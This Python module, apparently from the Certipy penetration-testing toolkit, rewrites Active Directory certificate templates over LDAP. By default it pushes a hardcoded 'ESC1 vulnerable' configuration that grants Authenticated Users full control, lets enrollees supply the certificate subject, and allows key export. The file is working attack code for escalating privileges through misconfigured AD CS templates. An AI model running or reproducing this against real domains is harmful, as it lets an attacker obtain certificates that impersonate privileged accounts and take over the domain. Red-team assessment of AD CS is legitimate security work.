"""
Certificate Template Management Module.

This module implements the functionality to view and modify Active Directory
certificate templates, allowing security assessment and exploitation of
misconfigured templates in AD CS environments.
"""

import argparse
import collections
import json
import logging
from itertools import groupby
from typing import Any, Dict, Optional

import ldap3
from ldap3.core.results import RESULT_INSUFFICIENT_ACCESS_RIGHTS
from ldap3.protocol.microsoft import security_descriptor_control
from ldap3.utils.conv import escape_filter_chars

from certipy.lib.ldap import LDAPConnection, LDAPEntry
from certipy.lib.logger import logging
from certipy.lib.target import Target

# Attributes that should not be modified to avoid breaking template functionality
PROTECTED_ATTRIBUTES = [
    "objectClass",
    "cn",
    "distinguishedName",
    "whenCreated",
    "whenChanged",
    "name",
    "objectGUID",
    "objectCategory",
    "dSCorePropagationData",
    "msPKI-Cert-Template-OID",
    "uSNCreated",
    "uSNChanged",
    "displayName",
    "instanceType",
    "revision",
    "msPKI-Template-Schema-Version",
    "msPKI-Template-Minor-Revision",
]

# ESC1 vulnerable template configuration with full control for 'Authenticated Users'
# This configuration creates a template that allows any authenticated user to enroll
# and obtain certificates with client authentication EKU
# TODO: Construct fields dynamically instead of hardcoding values
CONFIGURATION_TEMPLATE = {
    "showInAdvancedViewOnly": [b"TRUE"],
    # Security descriptor giving Authenticated Users full control
    "nTSecurityDescriptor": [
        b"\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00"
        b"\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00"
        b"\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00"
        b"\x00\x00\xc8\xa3\x1f\xdd\xe9\xba\xb8\x90,\xaes\xbb\xf4\x01\x00\x00"
    ],
    "flags": [b"0"],  # Template flags
    "pKIDefaultKeySpec": [b"2"],  # Key spec (RSA)
    "pKIKeyUsage": [b"\x86\x00"],  # Digital Signature, Key Encipherment
    "pKIMaxIssuingDepth": [b"-1"],  # No constraint on issuing depth
    "pKICriticalExtensions": [b"2.5.29.19", b"2.5.29.15"],  # Critical extensions
    "pKIExpirationPeriod": [b"\x00@\x1e\xa4\xe8e\xfa\xff"],  # 1 year validity
    "pKIOverlapPeriod": [b"\x00\x80\xa6\n\xff\xde\xff\xff"],  # 6 week overlap
    "pKIDefaultCSPs": [b"1,Microsoft Enhanced Cryptographic Provider v1.0"],
    "msPKI-RA-Signature": [b"0"],  # No RA signature required
    "msPKI-Enrollment-Flag": [b"0"],  # No special enrollment flags
    "msPKI-Private-Key-Flag": [b"16842768"],  # Allow export
    "msPKI-Certificate-Name-Flag": [b"1"],  # Name flags
    "msPKI-Minimal-Key-Size": [b"2048"],  # Minimum 2048-bit key
}


class Template:
    """
    Certificate Template management class for viewing and modifying AD CS templates.

    This class provides functionality to retrieve, save, and modify certificate
    template configurations in Active Directory Certificate Services.
    """

    def __init__(
        self,
        target: "Target",
        template: Optional[str] = None,
        configuration: Optional[str] = None,
        save_old: bool = False,
        scheme: str = "ldaps",
        connection: Optional[LDAPConnection] = None,
        **kwargs,  # type: ignore
    ):
        """
        Initialize a Template object for certificate template operations.

        Args:
            target: Target domain information
            template: Name of the certificate template to operate on
            configuration: Path to configuration file to apply
            save_old: Whether to save the old configuration before modifying
            scheme: LDAP connection scheme (ldap or ldaps)
            connection: Optional existing LDAP connection to reuse
            **kwargs: Additional keyword arguments
        """
        self.target = target
        self.template_name = template
        self.configuration = configuration
        self.save_old = save_old
        self.scheme = scheme
        self.kwargs = kwargs

        self._connection = connection

    @property
    def connection(self) -> LDAPConnection:
        """
        Lazily establish and return an LDAP connection.

        Returns:
            An active LDAP connection to the target domain
        """
        if self._connection is not None:
            return self._connection

        self._connection = LDAPConnection(self.target, self.scheme)
        self._connection.connect()

        return self._connection

    def configuration_to_json(self, configuration: Dict[str, Any]) -> str:
        """
        Convert a template configuration to a JSON string.

        Converts binary attribute values to their hexadecimal representation
        for storage in JSON format.

        Args:
            configuration: Template configuration dictionary

        Returns:
            JSON string representation of the configuration
        """
        output = {}
        for key, value in configuration.items():
            if key in PROTECTED_ATTRIBUTES:
                continue

            if isinstance(value, list):
                output[key] = [item.hex() for item in value]
            else:
                output[key] = value.hex()

        return json.dumps(output, indent=2)

    def get_configuration(self, template_name: str) -> Optional[LDAPEntry]:
        """
        Retrieve the configuration for a certificate template from AD.

        Searches for the template by CN or displayName and returns its configuration.

        Args:
            template_name: Name of the certificate template to find

        Returns:
            LDAPEntry containing the template configuration or None if not found
        """
        escaped_template = escape_filter_chars(template_name)

        # First try searching by CN
        results = self.connection.search(
            search_filter=f"(&(cn={escaped_template})(objectClass=pKICertificateTemplate))",
            search_base=self.connection.configuration_path,
            query_sd=True,
        )

        # If not found by CN, try displayName
        if not results:
            results = self.connection.search(
                f"(&(displayName={escaped_template})(objectClass=pKICertificateTemplate))",
                search_base=self.connection.configuration_path,
                query_sd=True,
            )

            if not results:
                logging.error(
                    f"Could not find any certificate template for {template_name!r}"
                )
                return None

        if len(results) > 1:
            # This should never happen, but just in case
            logging.error(
                f"Found multiple certificate templates identified by {template_name!r}"
            )
            return None

        return results[0]

    def json_to_configuration(
        self, configuration_json: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Convert a JSON configuration back to a usable LDAP configuration.

        Converts hexadecimal strings back to binary data for LDAP operations.

        Args:
            configuration_json: Dictionary loaded from JSON

        Returns:
            Configuration dictionary with binary values ready for LDAP
        """
        output = {}
        for key, value in configuration_json.items():
            if key in PROTECTED_ATTRIBUTES:
                continue

            if isinstance(value, list):
                output[key] = [bytes.fromhex(item) for item in value]
            else:
                output[key] = bytes.fromhex(value)

        return output

    def load_configuration(self, configuration_path: str) -> Dict[str, Any]:
        """
        Load a template configuration from a JSON file.

        Args:
            configuration_path: Path to the configuration JSON file

        Returns:
            Configuration dictionary with binary values

        Raises:
            ValueError: If the JSON file doesn't contain a dictionary
            FileNotFoundError: If the configuration file can't be found
        """
        try:
            with open(configuration_path, "r") as f:
                configuration_json = json.load(f)

            if not isinstance(configuration_json, dict):
                raise ValueError(
                    f"Expected a JSON object, got {type(configuration_json)!r}"
                )

            return self.json_to_configuration(configuration_json)
        except FileNotFoundError:
            logging.error(f"Configuration file not found: {configuration_path}")
            raise
        except json.JSONDecodeError:
            logging.error(f"Invalid JSON in configuration file: {configuration_path}")
            raise ValueError("Invalid JSON in configuration file")

    def set_configuration(self) -> bool:
        """
        Apply a new configuration to a certificate template.

        If no configuration file is provided, applies the default vulnerable
        configuration. If save_old is True, saves the current configuration
        before applying changes.

        Returns:
            True if the template was successfully updated, False otherwise
        """
        if not self.template_name:
            logging.error("A template (-template) is required")
            return False

        # Get the configuration to apply
        if self.configuration:
            try:
                new_configuration = self.load_configuration(self.configuration)
            except (FileNotFoundError, ValueError):
                return False
        else:
            # Use the default vulnerable configuration
            new_configuration = CONFIGURATION_TEMPLATE

        # Get the current configuration
        old_configuration = self.get_configuration(self.template_name)
        if not old_configuration:
            return False

        # Save the old configuration if requested
        if self.save_old:
            old_configuration_json = self.configuration_to_json(
                old_configuration["raw_attributes"]
            )

            template_name = old_configuration.get("cn")
            out_file = f"{template_name}.json"

            # Replace slashes with underscores for safe filenames
            out_file = out_file.replace("\\", "_").replace("/", "_")

            with open(out_file, "w") as f:
                _ = f.write(old_configuration_json)

            logging.info(
                f"Saved old configuration for {self.template_name!r} to {out_file!r}"
            )

        # Compute the changes to make
        changes = self._compute_changes(old_configuration, new_configuration)

        if not changes:
            logging.warning(
                "New configuration is the same as old configuration. Not updating"
            )
            return False

        # Apply the changes
        return self._apply_changes(old_configuration, changes)

    def _compute_changes(
        self, old_configuration: LDAPEntry, new_configuration: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Compute the changes needed to update a template configuration.

        Args:
            old_configuration: Current template configuration
            new_configuration: New template configuration to apply

        Returns:
            Dictionary of changes to apply using LDAP modify operation
        """
        changes = {}

        # Check for attributes to delete or modify
        for key in old_configuration["raw_attributes"].keys():
            if key in PROTECTED_ATTRIBUTES:
                continue

            # Delete attributes not in the new configuration
            if key not in new_configuration:
                changes[key] = [(ldap3.MODIFY_DELETE, [])]
                continue

            # Replace attributes with new values if different
            old_values = old_configuration.get_raw(key)
            new_values = new_configuration[key]

            if collections.Counter(old_values) != collections.Counter(new_values):
                changes[key] = [(ldap3.MODIFY_REPLACE, new_values)]

        # Add new attributes not in the old configuration
        for key, value in new_configuration.items():
            if (
                key in changes
                or key in PROTECTED_ATTRIBUTES
                or key in old_configuration["raw_attributes"]
            ):
                continue

            changes[key] = [(ldap3.MODIFY_ADD, value)]

        return changes

    def _apply_changes(
        self, old_configuration: LDAPEntry, changes: Dict[str, Any]
    ) -> bool:
        """
        Apply computed changes to a template configuration.

        Args:
            old_configuration: Current template configuration
            changes: Dictionary of changes to apply

        Returns:
            True if changes were applied successfully, False otherwise
        """
        template_name = old_configuration.get("cn")
        logging.info(f"Updating certificate template {template_name!r}")

        # Log the changes grouped by operation type
        self._log_changes(changes)

        # Apply the changes
        result = self.connection.modify(
            old_configuration.get("distinguishedName"),
            changes,
            controls=security_descriptor_control(sdflags=0x4),
        )

        if result["result"] == 0:
            logging.info(f"Successfully updated {template_name!r}")
            return True
        elif result["result"] == RESULT_INSUFFICIENT_ACCESS_RIGHTS:
            logging.error(
                f"User {self.target.username!r} doesn't have permission to update "
                f"these attributes on {template_name!r}"
            )
        else:
            logging.error(f"Got error: {result['message']}")

        return False

    def _log_changes(self, changes: Dict[str, Any]) -> None:
        """
        Log the changes to be applied, grouped by operation type.

        Args:
            changes: Dictionary of changes to apply
        """
        # Group changes by operation (MODIFY_DELETE, MODIFY_REPLACE, MODIFY_ADD)
        by_op = lambda item: item[1][0][0]

        for op, group in groupby(sorted(changes.items(), key=by_op), by_op):
            op_name = {
                ldap3.MODIFY_ADD: "Adding",
                ldap3.MODIFY_DELETE: "Deleting",
                ldap3.MODIFY_REPLACE: "Replacing",
            }.get(op, op)

            logging.debug(f"{op_name}:")

            for item in list(group):
                key = item[0]
                value = item[1][0][1]
                logging.debug(f"    {key}: {value!r}")


def entry(options: argparse.Namespace) -> None:
    """
    Entry point for the template command.

    Args:
        options: Command-line arguments
    """
    target = Target.from_options(options, dc_as_target=True)

    # Remove target from options to avoid duplicate argument
    options.__delattr__("target")

    template = Template(target=target, **vars(options))
    _ = template.set_configuration()
